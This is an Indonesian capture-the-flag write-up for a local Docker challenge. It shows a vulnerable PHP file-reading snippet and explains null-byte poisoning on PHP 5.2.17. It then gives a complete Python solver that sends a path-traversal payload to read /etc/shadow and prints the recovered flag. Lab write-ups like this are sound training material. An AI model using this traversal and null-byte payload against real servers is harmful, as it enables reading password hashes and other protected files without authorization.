# WriteUp: Tentu Saja Ini Adalah My...

## Overview

* **Judul:** Tentu Saja Ini Adalah My...
* **Kategori:** File Exploitation
* **Poin:** 250
* **Deskripsi:** Bisa ngga lu menyusuri jejak si karbit?
* **Author:** (Unknown/Platform Specific)
* **URL:** `http://localhost:1337`

## Informasi Attachment

File yang diberikan adalah `karbit3.yml`.

**Struktur Direktori:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/File Exploitation/Tentu Saja Ini Adalah My...]
└─$ tree
.
├── karbit3.yml
└── exploit.py

0 directories, 2 files

```

**Konten File (`karbit3.yml`):**

```yaml
services:
  web:
    image: ghcr.io/hengkerrusia/dirtrav3:latest
    ports:
      - "1337:80"
    environment:
      - PWN=${PWN:-testuser}
    restart: unless-stopped

```

## Proses Penyelesaian

### 1. Menjalankan Environment

Challenge dijalankan menggunakan Docker Compose pada port **1337**.

**Output Terminal:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/File Exploitation/Tentu Saja Ini Adalah My...]
└─$ PWN=WanZKey docker compose -f karbit3.yml up -d --build

```

### 2. Source Code Analysis (White Box)

Melakukan inspeksi file `index.php` dan environment server.

**Snippet Vulnerable (`index.php`):**

```php
$file = isset($_GET['file']) ? $_GET['file'] : '';
// ...
if ($file) {
    // VULNERABILITY: Forced Extension
    // Input user dipaksa ditambahkan ekstensi .mp4
    $path = $file . ".mp4";

    if (file_exists($path)) {
         readfile($path);
         exit;
    }
    // ...
}

```

**Pengecekan Versi PHP:**

```bash
docker exec tentusajainiadalahmy-web-1 php -v
# Output: PHP 5.2.17 (cli) (built: Apr 14 2018 00:00:06)

```

**Analisis Kerentanan:**

1. **Old PHP Version:** Server menggunakan **PHP 5.2.17**. Versi ini (di bawah 5.3.4) rentan terhadap **Null Byte Poisoning**.
2. **Logic Error:** Kode memaksa penambahan ekstensi `.mp4` pada input user. Normalnya, ini mencegah LFI ke file non-mp4.
3. **Exploit:** Dengan menyisipkan Null Byte (`%00` atau `\x00`) di akhir payload, fungsi sistem level rendah (C-based) seperti `readfile` atau `file_exists` akan berhenti membaca string tepat di karakter null byte tersebut, mengabaikan ekstensi `.mp4` di belakangnya.
* PHP String: `../../../../etc/shadow\0.mp4`
* Filesystem Read: `../../../../etc/shadow` (Stop at `\0`)



### 3. Enumeration & Flag Hunting

Pencarian lokasi flag dilakukan melalui akses shell docker:

1. Cek `/home/denji/.bashrc`: Ada pesan *"I moved it to a safer place."*
2. Cek `/home/denji/.bash_history`: User melakukan `sudo -i` (akses root).
3. Cek `/etc/shadow`: File ini berisi hash password user sistem. Flag ditemukan menggantikan hash password milik user **root**.

### 4. Exploitation

Mengirimkan payload traversal yang diakhiri Null Byte untuk membaca `/etc/shadow`.

**Payload:**
`../../../../etc/shadow%00` (dikirim sebagai raw byte `\x00` di script).

## Script Solver

Script Python untuk melakukan eksploitasi Null Byte Injection.

**File:** `exploit.py`

```python
import requests
import re

# Target URL
URL = "http://localhost:1337"

def exploit():
    print(f"[*] Target: {URL}")
    print("[*] Vulnerability: PHP 5.2.17 Null Byte Poisoning")
    
    # Target file: /etc/shadow (Isi password hash user Linux)
    # Lokasi ini kita dapet dari hasil 'grep' manual di server.
    target_file = "/etc/shadow"
    
    # Payload:
    # 1. Traversal: ../../../../ buat naik ke root
    # 2. Target: etc/shadow
    # 3. Null Byte (\x00): Buat memotong ekstensi .mp4 yang dipaksa sama kodingan PHP-nya
    payload = f"../../../../{target_file}\x00"
    
    print(f"[*] Sending Payload: {target_file} + %00")
    
    try:
        # Kirim Request dengan payload Null Byte
        r = requests.get(URL, params={'file': payload})
        
        # Cek apakah file kebaca (Status 200)
        if r.status_code == 200 and "File not found" not in r.text:
            print("[+] Injection Successful! /etc/shadow retrieved.")
            print("-" * 50)
            
            # Parsing output (biasanya kecampur HTML <pre>)
            content = r.text
            match = re.search(r'<pre>(.*?)</pre>', content, re.DOTALL)
            if match:
                content = match.group(1).strip()
            
            # Tampilkan baris Root yang mengandung flag
            # Format: root:pwn{...}:...
            found = False
            for line in content.splitlines():
                if "root" in line and "pwn{" in line:
                    print(f"[+] Raw Entry Found:\n    {line}")
                    
                    # Extract Flag pake Regex
                    flag = re.search(r'pwn\{.*?\}', line)
                    if flag:
                        print("-" * 50)
                        print(f"\n[!!!] JACKPOT! FLAG: {flag.group(0)}\n")
                        found = True
                        break
            
            if not found:
                print("[-] /etc/shadow opened, but flag not found in root entry.")
                
        else:
            print(f"[-] Failed. Status: {r.status_code}")
            
    except Exception as e:
        print(f"[-] Connection Error: {e}")

if __name__ == "__main__":
    exploit()

```

## Output Terminal Solver

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/File Exploitation/Tentu Saja Ini Adalah My...]
└─$ ./exploit.py
[*] Target: http://localhost:1337
[*] Vulnerability: PHP 5.2.17 Null Byte Poisoning
[*] Sending Payload: /etc/shadow + %00
[+] Injection Successful! /etc/shadow retrieved.
--------------------------------------------------
[+] Raw Entry Found:
    root:pwn{ccbab23acf41fb0511d120df4447ade8}:17256:0:99999:7:::
--------------------------------------------------

[!!!] JACKPOT! FLAG: pwn{ccbab23acf41fb0511d120df4447ade8}

```

## Flag

```
pwn{ccbab23acf41fb0511d120df4447ade8}

```
